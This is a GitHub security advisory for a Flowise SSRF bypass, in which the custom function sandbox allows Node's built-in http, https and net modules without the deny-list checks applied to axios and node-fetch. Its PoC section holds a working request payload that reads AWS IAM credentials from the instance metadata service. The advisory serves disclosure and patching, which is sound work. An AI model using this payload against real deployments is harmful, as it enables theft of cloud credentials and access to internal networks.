# [H] Flowise: SSRF Protection Bypass via Unprotected Built-in HTTP Modules in Custom Function Sandbox

## Summary
Severity: High
Advisory: GHSA-xhmj-rg95-44hv
CVE: CVE-2026-41270
CWE: CWE-284, CWE-918
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-xhmj-rg95-44hv
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.0
- npm: `flowise-components` — affected >=0 <3.1.0

## Details
### Summary
A Server-Side Request Forgery (SSRF) protection bypass vulnerability exists in the Custom Function feature. While the application implements SSRF protection via HTTP_DENY_LIST for axios and node-fetch libraries, the built-in Node.js `http`, `https`, and `net` modules are allowed in the NodeVM sandbox without equivalent protection. This allows authenticated users to bypass SSRF controls and access internal network resources (e.g., cloud provider metadata services)

### Details
The vulnerability exists in the sandbox configuration within `packages/components/src/utils.ts`

**Vulnerable Code - Allowed Built-in Modules (Line 56):**
```typescript
export const defaultAllowBuiltInDep = [
    'assert', 'buffer', 'crypto', 'events', 'http', 'https', 'net', 'path', 'querystring', 'timers',
    'url', 'zlib', 'os', 'stream', 'http2', 'punycode', 'perf_hooks', 'util', 'tls', 'string_decoder', 'dns', 'dgram'
]
```

**SSRF Protection Implementation (Lines 254-261):**
```typescript
// Only axios and node-fetch are wrapped with SSRF protection
secureWrappers['axios'] = secureAxiosWrapper
secureWrappers['node-fetch'] = secureNodeFetch

const defaultNodeVMOptions: any = {
    // ...
    require: {
        builtin: builtinDeps,      // <-- http, https, net allowed here
        mock: secureWrappers       // <-- Only mocks axios, node-fetch
    },
    // ...
}
```

**Root Cause:**
- The `secureWrappers` object only contains mocked versions of `axios` and `node-fetch` that enforce `HTTP_DENY_LIST`
- The built-in `http`, `https`, and `net` modules are passed directly to the sandbox via `builtinDeps` without any SSRF protection
- Users can import these modules directly and make arbitrary HTTP requests, which completely bypasses the intended security controls

**Affected File:** `packages/components/src/utils.ts`

**Related Files:**
- `packages/components/src/httpSecurity.ts` - Contains checkDenyList() function only used by axios/node-fetch wrappers
- `packages/server/src/controllers/nodes/index.ts` - API endpoint accepting user-controlled JavaScript code
- `packages/server/src/services/nodes/index.ts` - Service layer executing the code



### PoC
**Prerequisites:**
1. Flowise instance with `HTTP_DENY_LIST` configured (e.g., `HTTP_DENY_LIST=127.0.0.1,169.254.169.254,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16`)
2. Valid API key or authenticated session
3. For full impact demonstration - Flowise running on AWS EC2 with an IAM role attached

**Verify SSRF Protection is enabled (expect a block message by policy)**

Request:

```http
POST /api/v1/node-custom-function HTTP/1.1
Host: <host>
Content-Type: application/json
Authorization: Bearer <api_key>

{
  "javascriptFunction": "const axios = require('axios'); return (await axios.get('http://169.254.169.254/latest/meta-data/')).data;"
}
```

Response:

```json
{"statusCode":500,"success":false,"message":"Error: nodesService.executeCustomFunction - Error running custom function: Error: Error: NodeVM Execution Error: Error: Access to this host is denied by policy.","stack":{}}
```

**Bypass SSRF Protection using built-in http module**

Request:
```http
POST /api/v1/node-custom-function HTTP/1.1
Host: <host>
Content-Type: application/json
Authorization: Bearer <api_key>

{
  "javascriptFunction": "const http = require('http'); return new Promise((resolve) => { const tokenReq = http.request({ hostname: '169.254.169.254', path: '/latest/api/token', method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } }, (tokenRes) => { let token = ''; tokenRes.on('data', c => token += c); tokenRes.on('end', () => { const metaReq = http.request({ hostname: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/{IAM_Role}', headers: { 'X-aws-ec2-metadata-token': token } }, (metaRes) => { let data = ''; metaRes.on('data', c => data += c); metaRes.on('end', () => resolve(data)); }); metaReq.on('error', e => resolve('meta-error:' + e.message)); metaReq.end(); }); }); tokenReq.on('error', e => resolve('token-error:' + e.message)); tokenReq.end(); });"
}
```

Response:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-01-08T11:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-01-08T17:30:00Z"
}
```

<img width="1638" height="751" alt="image" src="https://github.com/user-attachments/assets/ed8b1dfd-516f-4e2b-a4ea-4dd259a8abf6" />


<img width="1633" height="986" alt="image" src="https://github.com/user-attachments/assets/12f6ecab-96df-42bc-9551-4a005ba6ba77" />





### Impact

**Vulnerability Type:** Server-Side Request Forgery (SSRF) with security controls bypass

**Who is Impacted:**
- All Flowise deployments where `HTTP_DENY_LIST` is configured for SSRF protection
- Deployments without `HTTP_DENY_LIST` are already vulnerable to SSRF via any method

**Impact Severity:**
1. Attackers can steal temporary IAM credentials from metadata services, which allows gaining access to other cloud resources
2. Scan internal networks, discover services, and identify attack targets
3. Reach databases, admin panels, and other internal APIs that should not be externally accessible

**Attack Requirements:**
- Authentication required (API key or session)
- Network access to Flowise instance

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-xhmj-rg95-44hv
- https://nvd.nist.gov/vuln/detail/CVE-2026-41270
- https://github.com/FlowiseAI/Flowise
